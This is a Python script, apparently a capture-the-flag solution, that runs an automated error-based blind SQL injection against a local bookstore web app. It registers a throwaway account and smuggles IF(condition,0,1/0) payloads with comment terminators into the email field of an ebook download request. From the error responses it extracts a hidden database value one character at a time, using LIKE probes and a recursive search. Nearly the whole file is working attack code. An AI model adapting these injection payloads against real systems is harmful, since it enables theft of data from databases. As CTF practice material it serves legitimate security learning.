import requests
import string
import random
# only lowercase letters
alphanumeric_charset = string.ascii_lowercase + string.digits
flag_charset = alphanumeric_charset + "}{_"

error = "1/0"
flagquery = "(SELECT texts FROM books LIMIT 1)"

target_url = "http://localhost:3000"
disallowed_wordlist = ["maplea", "maple{"]

total_requests = 0


def main():
    s = requests.Session()
    username = "".join(random.choices(alphanumeric_charset, k=10))
    password = "".join(random.choices(alphanumeric_charset, k=10))
    r = s.post(f"{target_url}/register", data={
        "username": username,
        "password": password,
    })
    print(r.text)
    r = s.post(f"{target_url}/login", data={
        "username": username,
        "password": password,
    })
    print(r.text)
    r = s.post(f"{target_url}/purchase", data={
        "bookID": "1",
    })
    print(r.text)

    # Test if a regular email with special tokens works
    payload = f"""\"owo\""""
    r = send_sqli_payload(s, payload)
    if not r:
        print("[-] Specials not allowed?")
        return
    # Test if a regular email of size 64 works
    payload = "a" * 64
    r = send_sqli_payload(s, payload)
    if not r:
        print("[-] Size 64 not allowed?")
        return

    flag_length = -1
    for i in range(100):
        cond = f"LENGTH({flagquery})={i}"
        payload = f"\"',IF({cond},1,{error}))-- \""
        r = send_sqli_payload(s, payload)
        if (r):
            flag_length = i

    print("[+] Error payload: " + str(len(error)))
    print("[+] Total payload: " + str(len(payload)))
    print("[+] Remaining stuff to shave off: " +
          str(len(payload) - 64))
    print("[+] Length of flag:", flag_length)
    if flag_length == -1:
        return
    # try
    flag = ""
    # get first char
    for c in flag_charset:
        cond = f"{flagquery} LIKE '{c}%'"
        payload = f"\"',IF({cond},0,{error}))-- \""
        r = send_sqli_payload(s, payload)
        if (r):
            flag += c
            break

    # get the second char
    for c in flag_charset:
        cond = f"{flagquery} LIKE '{flag}{c}%'"
        payload = f"\"',IF({cond},0,{error}))-- \""
        r = send_sqli_payload(s, payload)
        if (r):
            flag += c
            break

    # get the third char
    for c in flag_charset:
        cond = f"{flagquery} LIKE '{flag}{c}%'"
        payload = f"\"',IF({cond},0,{error}))-- \""
        r = send_sqli_payload(s, payload)
        if (r):
            flag += c
            break

    # flag = search(s, flag, flag_length - 3)
    flag = "maple{it_was_all_just_maple_l"
    flag = search(s, flag, flag_length - len(flag))

    print("[+] Error payload: " + str(len(error)))
    print("[+] Total payload: " + str(len(payload)))
    print("[+] Remaining stuff to shave off: " +
          str(len(payload) - 64))
    print("[+] Flag:", flag)
    global total_requests
    print("[+] Total requests: ", total_requests)


def search(s, flag_so_far, length_left):
    """returns the flag"""
    for i in range(length_left):
        print(flag_so_far)
        if flag_so_far[-1] == "_":
            last_word = flag_so_far[:-1].split("{")[1].split("_")[-1]
            if last_word in disallowed_wordlist:
                return None
        candidates = []
        lastchar = flag_so_far[-1]
        lastchars = flag_so_far[-2:]
        for c in flag_charset:
            cond = f"{flagquery} LIKE '%{lastchars}{c}%'"
            payload = f"\"',IF({cond},0,{error}))-- \""
            r = send_sqli_payload(s, payload)
            if (r):
                candidates.append(c)
        if len(candidates) == 0:
            return None
        elif len(candidates) == 1:
            flag_so_far += candidates[0]
        else:
            priority = []
            for candidate in candidates:
                if candidate not in flag_so_far:
                    priority.append(candidate)
            for candidate in candidates:
                if candidate != lastchar and candidate not in priority:
                    priority.append(candidate)
            for candidate in candidates:
                if candidate not in priority:
                    priority.append(candidate)
            for candidate in priority:
                res = search(s, flag_so_far + candidate, length_left - i - 1)
                if res is not None:
                    return res
            return None
    if flag_so_far[-1] != "}":
        return None
    return flag_so_far


def send_sqli_payload(s, payload):
    global total_requests
    total_requests += 1
    postamble = "@t.co"
    url = target_url
    data = {
        "email": f"{payload}{postamble}",
        "bookID": 1,
        "option": "kindle"
    }
    r = s.post(f"{url}/download-ebook", data=data)
    return not ("Invalid" in r.text or "Error" in r.text)


if __name__ == '__main__':
    main()
